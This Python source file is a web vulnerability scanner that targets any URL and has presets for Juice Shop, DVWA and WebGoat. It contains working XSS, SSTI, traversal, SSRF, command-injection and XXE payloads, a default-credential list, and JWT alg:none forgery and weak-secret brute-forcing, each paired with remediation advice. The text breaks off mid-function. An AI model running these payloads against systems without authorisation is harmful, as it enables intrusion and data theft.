"""
scanner.py
==========
Accepts any URL from the command line.  Two scan modes:

  standard  — Nikto + Nuclei + SQLMap + core OWASP checks
              (headers, auth, IDOR, XSS, SQLi, CORS, cookies, version disclosure)

  deep      — everything in standard PLUS:
              SSRF, XXE, SSTI, path traversal, command injection,
              JWT attacks, open redirect, CSRF, SRI, deserialization,
              timing-based rate-limit detection, HTTP verb tampering,
              business-logic probes, subdomain/directory enumeration hints,
              clickjacking frame test, cache-poisoning hints,
              GraphQL introspection, WebSocket detection,
              host-header injection, HTTP request smuggling hints,
              insecure direct object reference fuzzing,
              prototype pollution canaries, LDAP/XPath injection probes,
              HTTP parameter pollution, file upload bypass probes

Usage:
  python scanner.py --url http://target.example.com [--mode deep]
                    [--preset juice_shop|dvwa|webgoat]
                    [--token <bearer>] [--cookie-str "k=v; k2=v2"]
                    [--username admin] [--password secret]
                    [--list]
"""

import argparse, base64, datetime, json, os, re, subprocess, sys, time, urllib.parse, urllib3, shutil, zipfile, io as _io
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Auto-install nuclei if not found ──────────────────────────────────────────
NUCLEI_VERSION = "3.3.7"
def ensure_nuclei():
    """Download nuclei binary if not already installed."""
    if shutil.which("nuclei"):
        return  # already installed
    nuclei_path = "/tmp/nuclei"
    if os.path.isfile(nuclei_path) and os.access(nuclei_path, os.X_OK):
        os.environ["PATH"] = "/tmp:" + os.environ.get("PATH", "")
        return
    try:
        url = f"https://github.com/projectdiscovery/nuclei/releases/download/v{NUCLEI_VERSION}/nuclei_{NUCLEI_VERSION}_linux_amd64.zip"
        print(f"[*] Downloading nuclei v{NUCLEI_VERSION}...")
        resp = requests.get(url, timeout=60)
        resp.raise_for_status()
        with zipfile.ZipFile(_io.BytesIO(resp.content)) as zf:
            zf.extract("nuclei", "/tmp")
        os.chmod(nuclei_path, 0o755)
        os.environ["PATH"] = "/tmp:" + os.environ.get("PATH", "")
        print(f"[+] Nuclei installed to {nuclei_path}")
    except Exception as e:
        print(f"[!] Could not install nuclei: {e}")

ensure_nuclei()

# ── Severity helpers ──────────────────────────────────────────────────────────
SEVERITY_ORDER = {"critical":0,"high":1,"medium":2,"low":3,"info":4,"unknown":5}
SEVERITY_BADGE = {
    "critical":"🔴 CRITICAL","high":"🟠 HIGH","medium":"🟡 MEDIUM",
    "low":"🔵 LOW","info":"⚪ INFO","unknown":"⚫ UNKNOWN",
}

OWASP_NAMES = {
    "A01":"A01 — Broken Access Control",
    "A02":"A02 — Cryptographic Failures",
    "A03":"A03 — Injection",
    "A04":"A04 — Insecure Design",
    "A05":"A05 — Security Misconfiguration",
    "A06":"A06 — Vulnerable & Outdated Components",
    "A07":"A07 — Identification & Authentication Failures",
    "A08":"A08 — Software & Data Integrity Failures",
    "A09":"A09 — Security Logging & Monitoring Failures",
    "A10":"A10 — Server-Side Request Forgery",
    "EXT":"Extended / Additional Checks",
}

# ── Preset-specific hints (endpoints, known login paths, etc.) ────────────────
PRESETS = {
    "juice_shop": {
        "login_path":   "/rest/user/login",
        "login_method": "json",
        "login_json":   {"email":"admin@juice-sh.op","password":"admin123"},
        "idor_paths":   ["/rest/user/1","/rest/user/2","/rest/basket/1","/rest/basket/2"],
        "admin_paths":  ["/administration","/admin","/rest/admin","/metrics"],
        "xss_params":   [("GET","/rest/products/search","q")],
        "jwt_paths":    ["/rest/user/whoami"],
        "redirect_param": "/redirect?to=",
        "sensitive":    ["/rest/user/whoami","/rest/memories","/api/Feedbacks","/rest/saveLoginIp"],
        "sqlmap_endpoints": [
            ("http://127.0.0.1:3000/rest/products/search","GET",{"q":"test"}),
            ("http://127.0.0.1:3000/rest/user/login","POST",{"email":"test@test.com","password":"test"}),
        ],
    },
    "dvwa": {
        "login_path":   "/login.php",
        "login_method": "form_dvwa",
        "idor_paths":   [],
        "admin_paths":  ["/phpMyAdmin","/phpmyadmin","/setup.php"],
        "xss_params":   [("GET","/vulnerabilities/xss_r/","name"),("GET","/vulnerabilities/xss_d/","default")],
        "jwt_paths":    [],
        "redirect_param": None,
        "sensitive":    ["/vulnerabilities/upload/","/hackable/uploads/"],
        "sqlmap_endpoints": [
            ("http://127.0.0.1:8081/vulnerabilities/sqli/","GET",{"id":"1","Submit":"Submit"}),
            ("http://127.0.0.1:8081/vulnerabilities/sqli_blind/","GET",{"id":"1","Submit":"Submit"}),
        ],
    },
    "webgoat": {
        "login_path":   "/WebGoat/login",
        "login_method": "form",
        "idor_paths":   [],
        "admin_paths":  ["/WebGoat/actuator","/WebGoat/actuator/env","/WebGoat/actuator/health"],
        "xss_params":   [("POST","/WebGoat/CrossSiteScripting/attack5a","editor")],
        "jwt_paths":    [],
        "redirect_param": None,
        "sensitive":    ["/WebGoat/service/lessonoverview.mvc"],
        "sqlmap_endpoints": [
            ("http://127.0.0.1:8082/WebGoat/SqlInjection/attack5a","POST",
             {"account":"Smith","operator":"AND","injection":"1"}),
        ],
    },
}

# ── Payload libraries ─────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

SSTI_PAYLOADS = [
    ("{{7*7}}",    "49"),   # Jinja2/Twig
    ("${7*7}",     "49"),   # FreeMarker / Spring EL
    ("#{7*7}",     "49"),   # Thymeleaf
    ("<%= 7*7 %>", "49"),   # ERB
    ("*{7*7}",     "49"),   # Thymeleaf SpEL
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/proc/self/environ",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
]

CMD_PAYLOADS = [
    "; id",         "| id",       "$(id)",
    "&& id",        "`id`",       "; sleep 5",
    "| sleep 5",    "$(sleep 5)", "&& sleep 5",
]

XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<root><data>&xxe;</data></root>"
)

XXE_SSRF_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>'
    "<root><data>&xxe;</data></root>"
)

REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "/\\evil.example.com",
    "https:evil.example.com",
    "%2F%2Fevil.example.com",
]

DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","admin123"),
    ("admin","123456"),("admin",""),("root","root"),
    ("test","test"),("guest","guest"),("user","user123"),
    ("administrator","administrator"),("operator","operator"),
]

SENSITIVE_PATHS = [
    "/.git/HEAD","/.git/config","/.env","/.env.local","/.env.production",
    "/config.php","/wp-config.php","/web.config","/appsettings.json",
    "/backup.zip","/backup.sql","/dump.sql","/db.sqlite",
    "/server-status","/server-info","/phpinfo.php","/info.php","/test.php",
    "/api/v1/users","/api/users","/api/admin","/api/config",
    "/swagger-ui.html","/swagger-ui/","/api-docs","/openapi.json","/swagger.json",
    "/graphql","/graphiql","/__graphql","/graphql/console",
    "/actuator","/actuator/env","/actuator/health","/actuator/beans","/actuator/mappings",
    "/console","/h2-console","/druid","/manager/html",
    "/robots.txt","/sitemap.xml","/.well-known/security.txt",
    "/crossdomain.xml","/clientaccesspolicy.xml",
    "/trace","/TRACE","/track",
    "/admin","/administrator","/administration","/admin.php","/admin/login",
    "/login","/signin","/dashboard","/panel","/manage",
    "/metrics","/health","/status","/ping","/version","/build-info",
]

VERB_TAMPERING_PATHS = ["/admin","/api/users","/config","/actuator"]

HTTP_METHODS = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD","TRACE","CONNECT"]

NIKTO_SEVERITY_MAP = {
    "X-Frame-Options":           ("medium","Clickjacking header missing","Add X-Frame-Options: DENY or SAMEORIGIN."),
    "X-Content-Type-Options":    ("low","MIME sniffing protection missing","Add X-Content-Type-Options: nosniff."),
    "Strict-Transport-Security": ("medium","HSTS absent","Enable HSTS with max-age≥31536000."),
    "Content-Security-Policy":   ("medium","CSP missing","Define a strict Content-Security-Policy."),
    "/admin":                    ("high","Admin path exposed","Restrict /admin to authorised users."),
    "/config":                   ("high","Config endpoint accessible","Remove or protect config endpoints."),
    "phpinfo":                   ("high","phpinfo exposed","Delete or restrict phpinfo pages."),
    "/.git":                     ("critical","Git repo exposed","Block /.git at the web server."),
    "backup":                    ("high","Backup file accessible","Remove backup files from web root."),
    "SQL":                       ("high","SQL error in response","Use parameterised queries."),
    "server-status":             ("medium","Apache server-status exposed","Restrict to localhost."),
    "etag":                      ("low","ETag leaks inode","Use content-hash ETags."),
    "cookie":                    ("medium","Cookie missing security flags","Set HttpOnly and Secure."),
    "Referrer-Policy":           ("low","Referrer-Policy missing","Add Referrer-Policy: no-referrer."),
    "Permissions-Policy":        ("low","Permissions-Policy missing","Add Permissions-Policy header."),
    "Access-Control-Allow-Origin":("high","Wildcard CORS","Restrict CORS to trusted origins."),
    "X-Powered-By":              ("low","X-Powered-By leaks stack","Remove X-Powered-By header."),
    "actuator":                  ("critical","Actuator endpoint exposed","Restrict with auth."),
    "swagger":                   ("medium","Swagger UI public","Restrict to authenticated users."),
    "graphql":                   ("medium","GraphQL introspection","Disable in production."),
    "/.env":                     ("critical",".env file exposed","Block dotfiles immediately."),
    "debug":                     ("high","Debug mode detected","Disable debug in production."),
    "stack trace":               ("high","Stack trace in response","Return generic error pages."),
    "traceback":                 ("high","Python traceback exposed","Set DEBUG=False."),
}


# ── Auth helpers ──────────────────────────────────────────────────────────────
def get_auth_session(preset_key, base_url, username=None, password=None):
    """
    For known presets, attempt the standard login flow.
    If username/password provided, try a generic form/JSON login.
    Returns an auth dict  {"Authorization": "Bearer …"} or {"cookie": "val"}.
    """
    session = requests.Session()
    cfg = PRESETS.get(preset_key, {})

    try:
        if preset_key == "juice_shop":
            creds = cfg["login_json"].copy()
            if username: creds["email"]    = username
            if password: creds["password"] = password
            r = session.post(f"{base_url}{cfg['login_path']}", json=creds, timeout=6, verify=False)
            token = r.json().get("authentication", {}).get("token")
            if token:
                print(f"[+] Auth OK for juice_shop (Bearer token)")
                return {"Authorization": f"Bearer {token}"}
            print("[!] Auth: no token in Juice Shop response")
            return None

        elif preset_key == "dvwa":
            if username is None: username = "admin"
            if password is None: password = "password"
            lp = session.get(f"{base_url}/login.php", timeout=6, verify=False).text
            csrf = lp.split("user_token' value='")[1].split("'")[0]
            session.post(f"{base_url}/login.php",
                         data={"username":username,"password":password,
                               "Login":"Login","user_token":csrf},
                         timeout=6, verify=False)
            session.get(f"{base_url}/security.php",
                        params={"security":"low","seclev_submit":"Submit"},
                        timeout=6, verify=False)
            print("[+] Auth OK for dvwa (cookies)")
            return session.cookies.get_dict()

        elif preset_key == "webgoat":
            if username is None: username = "admin"
            if password is None: password = "password"
            session.post(f"{base_url}/login",
                         data={"username":username,"password":password},
                         timeout=6, verify=False)
            print("[+] Auth OK for webgoat (cookies)")
            return session.cookies.get_dict()

        else:
            # Generic: try JSON login then form login
            if not username or not password:
                return None
            for path in ["/login","/api/login","/auth/login","/rest/login","/signin","/api/auth"]:
                for method in ["json","form"]:
                    try:
                        if method == "json":
                            r = session.post(f"{base_url}{path}",
                                             json={"username":username,"password":password,
                                                   "email":username},
                                             timeout=5, verify=False)
                        else:
                            r = session.post(f"{base_url}{path}",
                                             data={"username":username,"password":password,
                                                   "email":username},
                                             timeout=5, verify=False)
                        if r.status_code in (200, 302):
                            token = None
                            try:
                                token = r.json().get("token") or r.json().get("access_token")
                            except Exception:
                                pass
                            if token:
                                print(f"[+] Generic auth OK via {path} (Bearer)")
                                return {"Authorization": f"Bearer {token}"}
                            if session.cookies:
                                print(f"[+] Generic auth OK via {path} (cookies)")
                                return session.cookies.get_dict()
                    except Exception:
                        pass
            return None
    except Exception as e:
        print(f"[!] Auth failed: {e}")
        return None


def build_auth_from_args(args):
    """Build auth dict from raw CLI args (token / cookie string)."""
    auth = {}
    if args.token:
        auth["Authorization"] = f"Bearer {args.token}"
    if args.cookie_str:
        for part in args.cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                auth[k.strip()] = v.strip()
    return auth if auth else None


def make_headers(auth):
    if not auth: return {}
    return {k: v for k, v in auth.items() if k == "Authorization"}

def make_cookies(auth):
    if not auth: return {}
    return {k: v for k, v in auth.items() if k != "Authorization"}


# ── HTTP helpers ──────────────────────────────────────────────────────────────
def _get(url, auth, timeout=8, allow_redirects=False, params=None):
    try:
        return requests.get(url, headers=make_headers(auth), cookies=make_cookies(auth),
                            params=params, timeout=timeout, allow_redirects=allow_redirects,
                            verify=False)
    except Exception:
        return None

def _post(url, auth, data=None, json_body=None, extra_headers=None, timeout=8):
    try:
        h = make_headers(auth)
        if extra_headers: h.update(extra_headers)
        return requests.post(url, headers=h, cookies=make_cookies(auth),
                             data=data, json=json_body, timeout=timeout, verify=False)
    except Exception:
        return None

def _req(method, url, auth, timeout=8, **kwargs):
    try:
        return requests.request(method, url, headers=make_headers(auth),
                                cookies=make_cookies(auth), timeout=timeout,
                                verify=False, **kwargs)
    except Exception:
        return None


# ── Finding factory ───────────────────────────────────────────────────────────
def F(owasp, severity, title, description, remediation, evidence="", endpoint=""):
    return {"owasp":owasp,"severity":severity,"title":title,
            "description":description,"remediation":remediation,
            "evidence":str(evidence)[:400],"endpoint":endpoint}


# ===========================================================================
#  STANDARD CHECKS  (always run)
# ===========================================================================

def check_security_headers(base_url, auth):
    """A05 — missing security headers + leaking headers."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    h = {k.lower(): v for k, v in r.headers.items()}

    required = {
        "x-frame-options":           ("medium","Clickjacking — X-Frame-Options missing",
                                      "Set X-Frame-Options: DENY or SAMEORIGIN."),
        "x-content-type-options":    ("low","MIME sniffing — X-Content-Type-Options missing",
                                      "Set X-Content-Type-Options: nosniff."),
        "strict-transport-security": ("medium","HSTS absent",
                                      "Set Strict-Transport-Security: max-age=31536000; includeSubDomains."),
        "content-security-policy":   ("medium","CSP absent — XSS risk elevated",
                                      "Define a restrictive Content-Security-Policy."),
        "referrer-policy":           ("low","Referrer-Policy missing",
                                      "Set Referrer-Policy: no-referrer or strict-origin."),
        "permissions-policy":        ("low","Permissions-Policy missing",
                                      "Add a Permissions-Policy to restrict browser features."),
    }
    for hdr, (sev, title, rem) in required.items():
        if hdr not in h:
            findings.append(F("A05", sev, title,
                               f"The `{hdr}` header is absent from HTTP responses.", rem, "", base_url))

    leaking = {"server":"low","x-powered-by":"low","x-aspnet-version":"low","x-generator":"low"}
    for hdr, sev in leaking.items():
        if hdr in h:
            findings.append(F("A05", sev, f"Version disclosure via `{hdr}`",
                               f"`{hdr}: {h[hdr]}` reveals implementation details.",
                               f"Remove or genericise the `{hdr}` response header.", h[hdr], base_url))

    acao = h.get("access-control-allow-origin","")
    if acao == "*":
        findings.append(F("A05","high","CORS wildcard origin",
                           "Access-Control-Allow-Origin: * allows any site to read responses.",
                           "Restrict CORS to a known allowlist of trusted origins.", "*", base_url))
    return findings


def check_cookies(base_url, auth):
    """A02 — insecure cookie flags."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    for cookie in r.cookies:
        issues = []
        if not cookie.secure: issues.append("Secure flag missing")
        if "httponly" not in str(cookie).lower(): issues.append("HttpOnly flag missing")
        if "samesite" not in str(cookie).lower(): issues.append("SameSite not set")
        if issues:
            findings.append(F("A02","medium",f"Insecure cookie: `{cookie.name}`",
                               f"Cookie `{cookie.name}` is missing: {', '.join(issues)}.",
                               "Set Secure, HttpOnly, SameSite=Strict on all session cookies.",
                               str(cookie)[:120], base_url))
    return findings


def check_https(base_url):
    """A02 — plain HTTP."""
    if base_url.startswith("http://"):
        return [F("A02","high","Application served over plain HTTP",
                   "All traffic is unencrypted. Credentials and tokens are exposed to network sniffing.",
                   "Deploy TLS everywhere. Redirect HTTP→HTTPS. Enable HSTS.", "", base_url)]
    return []


def check_sensitive_paths(base_url, auth):
    """A01 — forced browsing / sensitive file exposure."""
    findings = []
    for path in SENSITIVE_PATHS:
        url = base_url.rstrip("/") + path
        r = _get(url, None)
        if r and r.status_code == 200 and len(r.text) > 30:
            sev = "critical" if any(x in path for x in [".env",".git","backup","dump","actuator/env"]) else "high"
            findings.append(F("A01", sev, f"Sensitive path accessible: {path}",
                               f"`{path}` returned HTTP 200 without credentials.",
                               "Block or authenticate all sensitive paths.",
                               r.text[:150], url))
    return findings


def check_idor(base_url, auth, preset_cfg):
    """A01 — IDOR on preset-known object paths."""
    findings = []
    for ep in preset_cfg.get("idor_paths", []):
        url = base_url.rstrip("/") + ep
        r = _get(url, None)
        if r and r.status_code == 200:
            findings.append(F("A01","critical",f"IDOR — object accessible without auth: {ep}",
                               f"`{ep}` returns 200 with no credentials.",
                               "Enforce object-level auth; verify the requesting user owns the resource.",
                               r.text[:200], url))
    return findings


def check_admin_exposure(base_url, auth, preset_cfg):
    """A01 — admin paths accessible without auth."""
    findings = []
    for path in preset_cfg.get("admin_paths", ["/admin","/administrator","/admin/login"]):
        url = base_url.rstrip("/") + path
        r = _get(url, None)
        if r and r.status_code in (200, 302):
            sev = "critical" if r.status_code == 200 else "high"
            findings.append(F("A01", sev, f"Admin path reachable without auth: {path}",
                               f"`{path}` returned HTTP {r.status_code} with no credentials.",
                               "Require auth + authorisation on all admin paths.", f"HTTP {r.status_code}", url))
    return findings


def check_xss(base_url, auth, preset_cfg):
    """A03 — reflected XSS via preset-specified parameters."""
    findings = []
    for method, path, param in preset_cfg.get("xss_params", []):
        url = base_url.rstrip("/") + path
        for payload in XSS_PAYLOADS[:6]:
            try:
                if method == "GET":
                    r = _get(url, auth, params={param: payload}, allow_redirects=True)
                else:
                    r = _post(url, auth, data={param: payload})
                if r and payload.lower().replace(" ","") in (r.text or "").lower().replace(" ",""):
                    findings.append(F("A03","high",f"Reflected XSS in `{param}` at {path}",
                                       f"Payload `{payload}` reflected unescaped in response.",
                                       "HTML-encode all user input. Implement a strict CSP.",
                                       payload, url))
                    break
            except Exception:
                pass
    return findings


def check_version_disclosure(base_url, auth):
    """A06 — version strings in headers and body."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    h = {k.lower(): v for k, v in r.headers.items()}
    body = r.text

    for hdr in ["server","x-powered-by"]:
        m = re.search(r'([\w.]+)[/\s]([\d.]+)', h.get(hdr,""))
        if m:
            findings.append(F("A06","low",f"Version in `{hdr}`: {m.group(0)}",
                               f"Header reveals `{m.group(0)}` — cross-referenceable against CVEs.",
                               "Strip version strings from HTTP headers.", m.group(0), base_url))

    js_libs = [
        (r'jquery[/-]([\d.]+[\d])','jQuery'),(r'angular(?:js)?[.-]([\d.]+)','AngularJS'),
        (r'bootstrap[/-]([\d.]+)','Bootstrap'),(r'react[/-]([\d.]+)','React'),
        (r'vue[/-]([\d.]+)','Vue.js'),(r'lodash[/-]([\d.]+)','Lodash'),
        (r'moment[/-]([\d.]+)','Moment.js'),(r'backbone[/-]([\d.]+)','Backbone.js'),
    ]
    for pat, lib in js_libs:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            findings.append(F("A06","info",f"JS library version: {lib} {m.group(1)}",
                               f"`{lib} {m.group(1)}` visible in page source. May have known CVEs.",
                               f"Keep {lib} updated. Use SRI for CDN-loaded scripts.", m.group(0), base_url))
    return findings


def check_sensitive_data_exposure(base_url, auth):
    """A02 — sensitive data patterns in API responses."""
    findings = []
    r = _get(base_url, auth, allow_redirects=True)
    if not r: return findings
    body = r.text
    patterns = [
        (r'"password"\s*:\s*"[^"]+"',   "critical","Password field in API response"),
        (r'"secret"\s*:\s*"[^"]+"',     "critical","Secret field in response"),
        (r'"api_?key"\s*:\s*"[^"]+"',   "critical","API key in response"),
        (r'"credit_?card"\s*:\s*"[^"]+"',"critical","Credit card data in response"),
        (r'\b4[0-9]{12}(?:[0-9]{3})?\b',"critical","Possible Visa card number"),
        (r'"ssn"\s*:\s*"[^"]+"',        "critical","SSN field in response"),
        (r'"token"\s*:\s*"[^"]+"',      "high","Auth token in response"),
    ]
    for pat, sev, title in patterns:
        m = re.search(pat, body, re.IGNORECASE)
        if m:
            findings.append(F("A02", sev, title,
                               f"Response matches `{pat}` — sensitive data may be exposed.",
                               "Omit or mask sensitive fields in API responses.", m.group(0)[:80], base_url))
    return findings


def check_auth_endpoints(base_url, auth, preset_cfg):
    """A07 — unauthenticated access to sensitive endpoints."""
    findings = []
    for ep in preset_cfg.get("sensitive", []):
        url = base_url.rstrip("/") + ep
        r = _get(url, None)
        if r and r.status_code == 200 and len(r.text) > 80:
            findings.append(F("A07","high",f"Sensitive endpoint without auth: {ep}",
                               f"`{ep}` returned 200 ({len(r.text)} bytes) with no credentials.",
                               "Protect all sensitive endpoints with auth middleware.", r.text[:150], url))
    return findings


def check_verbose_errors(base_url, auth):
    """A09 — verbose error disclosure."""
    findings = []
    probes = ["/nonexistent-xyz","/'; DROP TABLE--","/%00","/<svg>"]
    markers = ["traceback","stack trace","at java.","syntaxerror","file \"",
               "mysql_fetch","sql syntax","warning: ","fatal error","undefined index"]
    for path in probes:
        r = _get(base_url.rstrip("/")+urllib.parse.quote(path,safe=""), auth)
        if r and r.status_code >= 400:
            hit = next((m for m in markers if m in r.text.lower()), None)
            if hit:
                findings.append(F("A09","high","Verbose error disclosure",
                                   f"Probing `{path}` returned error containing `{hit}`.",
                                   "Show generic error pages in production; log detail server-side only.",
                                   r.text[:300], base_url+path))
                break
    return findings


def check_cors(base_url, auth):
    """A05 — CORS misconfiguration with arbitrary origin reflection."""
    findings = []
    try:
        r = requests.get(base_url, headers={**make_headers(auth),"Origin":"https://evil.example.com"},
                         cookies=make_cookies(auth), timeout=8, verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin","")
        acac = r.headers.get("Access-Control-Allow-Credentials","")
        if acao == "https://evil.example.com":
            sev = "critical" if acac.lower() == "true" else "high"
            findings.append(F("A05", sev, "CORS — arbitrary origin reflected",
                               f"Server echoes back the attacker's origin `{acao}` with"
                               f" Allow-Credentials: {acac}.",
                               "Validate Origin against a strict allowlist; never reflect arbitrary origins.",
                               f"ACAO: {acao} | ACAC: {acac}", base_url))
        if acao == "*" and acac.lower() == "true":
            findings.append(F("A05","critical","CORS wildcard + Allow-Credentials",
                               "Wildcard CORS with credentials is invalid per spec but some browsers accept it.",
                               "Use explicit origins; never combine * with credentials.",
                               f"ACAO: {acao}", base_url))
    except Exception:
        pass
    return findings


# ===========================================================================
#  DEEP-ONLY CHECKS
# ===========================================================================

def check_ssti(base_url, auth, preset_cfg):
    """A03 — server-side template injection."""
    findings = []
    for method, path, param in preset_cfg.get("xss_params", []):
        url = base_url.rstrip("/")+path
        for payload, expected in SSTI_PAYLOADS:
            try:
                if method == "GET":
                    r = _get(url, auth, params={param:payload}, allow_redirects=True)
                else:
                    r = _post(url, auth, data={param:payload})
                if r and expected in (r.text or ""):
                    findings.append(F("A03","critical",f"SSTI in `{param}` at {path}",
                                       f"`{payload}` evaluated to `{expected}` — template engine executes user input.",
                                       "Never pass user input to template engines. Use sandboxed rendering.",
                                       f"{payload} → {expected}", url))
                    break
            except Exception:
                pass
    return findings


def check_path_traversal(base_url, auth):
    """A03 — path traversal via common parameter names."""
    findings = []
    params = ["file","path","page","doc","filename","template","view","include","load","read"]
    for param in params:
        for payload in TRAVERSAL_PAYLOADS:
            r = _get(base_url, auth, params={param:payload}, allow_redirects=True)
            if r and ("root:" in r.text or "[extensions]" in r.text or "for 16-bit app" in r.text):
                findings.append(F("A03","critical",f"Path Traversal via `{param}`",
                                   f"Payload `{payload}` returned file-system content.",
                                   "Validate all file-path inputs. Use allow-lists; never concatenate user input.",
                                   r.text[:200], base_url))
                return findings
    return findings


def check_command_injection(base_url, auth):
    """A03 — command injection via common parameter names."""
    findings = []
    params = ["cmd","exec","command","ping","host","ip","query","search","run","system"]
    for param in params:
        for payload in CMD_PAYLOADS[:5]:
            r = _get(base_url, auth, params={param:payload}, allow_redirects=True)
            if r and re.search(r'\buid=\d+\b', r.text or ""):
                findings.append(F("A03","critical",f"Command Injection via `{param}`",
                                   f"Payload `{payload}` appears executed (uid= in response).",
                                   "Never pass user input to shell. Use library calls not subprocess.",
                                   r.text[:200], base_url))
                return findings
    return findings


def check_xxe(base_url, auth):
    """A03 — XXE on XML-accepting endpoints."""
    findings = []
    xml_paths = ["/","/ api","/rest","/import","/upload","/parse","/process","/service","/ws"]
    for path in xml_paths:
        url = base_url.rstrip("/")+path
        r = _post(url, auth, data=XXE_PAYLOAD, extra_headers={"Content-Type":"application/xml"})
        if r and "root:" in (r.text or ""):
            findings.append(F("A03","critical",f"XXE at {path}",
                               "Server parsed XXE and returned /etc/passwd content.",
                               "Disable external entity processing. Prefer JSON over XML.",
                               r.text[:200], url))
            break
        r2 = _post(url, auth, data=XXE_SSRF_PAYLOAD, extra_headers={"Content-Type":"application/xml"})
        if r2 and r2.status_code == 200 and len((r2.text or "")) > 0:
            findings.append(F("A03","high",f"Possible XXE-SSRF at {path}",
                               "Server responded to an XXE SSRF payload — may be making internal requests.",
                               "Disable external entity processing in your XML parser.",
                               "", url))
            break
    return findings


def check_ssrf(base_url, auth):
    """A10 — SSRF via URL-fetching parameters."""
    findings = []
    params = ["url","redirect","next","callback","fetch","load","src","href",
              "image_url","webhook","endpoint","target","proxy","forward","dest"]
    for param in params:
        for payload in SSRF_PAYLOADS[:4]:
            r = _get(base_url, auth, params={param:payload})
            if r and r.status_code == 200 and len(r.text or "") > 50:
                if any(x in r.text.lower() for x in
                       ["ami-id","instance-id","169.254","localhost","127.0.0","::1","root:"]):
                    findings.append(F("A10","critical",f"SSRF via `{param}`",
                                       f"Supplying `{payload}` as `{param}` caused an internal request.",
                                       "Whitelist allowed URL schemes/hosts. Block RFC-1918 and loopback.",
                                       r.text[:200], base_url))
                    return findings
    return findings


def check_open_redirect(base_url, auth, preset_cfg):
    """A10 / A01 — open redirect."""
    findings = []
    redirect_param = preset_cfg.get("redirect_param")
    if not redirect_param:
        redirect_param = "?redirect="
    for payload in REDIRECT_PAYLOADS:
        url = base_url.rstrip("/")+redirect_param+urllib.parse.quote(payload)
        r = _get(url, auth, allow_redirects=False)
        if r and r.status_code in (301,302,303,307,308):
            loc = r.headers.get("Location","")
            if "evil.example" in loc or "evil" in loc:
                findings.append(F("A10","medium","Open Redirect",
                                   f"Redirect param accepts external URL: `{payload}` → `{loc}`",
                                   "Validate redirect targets against a strict allowlist.",
                                   f"Location: {loc}", url))
                break
    return findings


def check_jwt(base_url, auth, preset_cfg):
    """A07 — JWT weaknesses: none algorithm, weak secrets, sensitive claims."""
    findings = []
    if not auth or "Authorization" not in auth:
        return findings
    token = auth["Authorization"].replace("Bearer ","")
    parts = token.split(".")
    if len(parts) != 3:
        return findings

    # none algorithm
    header_none = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b"=").decode()
    forged = f"{header_none}.{parts[1]}."
    for ep in preset_cfg.get("jwt_paths",[]):
        try:
            r = requests.get(base_url.rstrip("/")+ep,
                             headers={"Authorization":f"Bearer {forged}"},
                             timeout=5, verify=False)
            if r and r.status_code == 200:
                findings.append(F("A07","critical",f"JWT 'none' algorithm accepted at {ep}",
                                   "Server accepted JWT with alg:none — signature verification skipped.",
                                   "Explicitly reject alg:none. Whitelist permitted algorithms.",
                                   f"HTTP {r.status_code}", base_url+ep))
        except Exception:
            pass

    # HS256 with weak secret brute-force (common secrets)
    weak_secrets = ["secret","password","123456","admin","key","jwt","token","changeme"]
    try:
        import hmac, hashlib
        header_b64  = parts[0]
        payload_b64 = parts[1]
        sig_b64     = parts[2]
        sig_bytes   = base64.urlsafe_b64decode(sig_b64 + "==")
        msg         = f"{header_b64}.{payload_b64}".encode()
        for secret in weak_secrets:
            computed = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            if computed == sig_bytes:
                findings.append(F("A07","critical","JWT signed with weak secret",
                                   f"JWT signature verified with secret: `{secret}`.",
                                   "Use a cryptographically random secret of ≥256 bits.",
                                   f"Secret: {secret}", ""))
                break
    except Exception:
        pass

    # Sensitive claims in payload
    try:
        padded  = parts[1] + "=="
        decoded = json.loads(base64.urlsafe_b64decode(padded))
        sensitive = {"password","secret","key","credit_card","ssn","pin"}
        hit = sensitive & {str(k).lower() for k in decoded}
        if hit:
            findings.append(F("A07","high","Sensitive fields in JWT payload",
                               f"JWT payload contains: {hit}. JWT is base64-encoded, not encrypted.",
                               "Never store sensitive data in JWT. Use JWE if needed.", str(list(hit)), ""))
    except Exception:
        pass

    return findings


def check_csrf(base_url, auth, preset_cfg):
    """A01 / A04 — CSRF token absence on forms."""
    findings = []
    login_path = preset_cfg.get("login_path","/login")
    r = _get(base_url.rstrip("/")+login_path, None, allow_redirects=True)
    if r and r.status_code == 200:
        body = r.text.lower()
        if not any(x in body for x in ["csrf","_token","nonce","requestverificationtoken"]):
            findings.append(F("A01","medium","No CSRF token on login/form page",
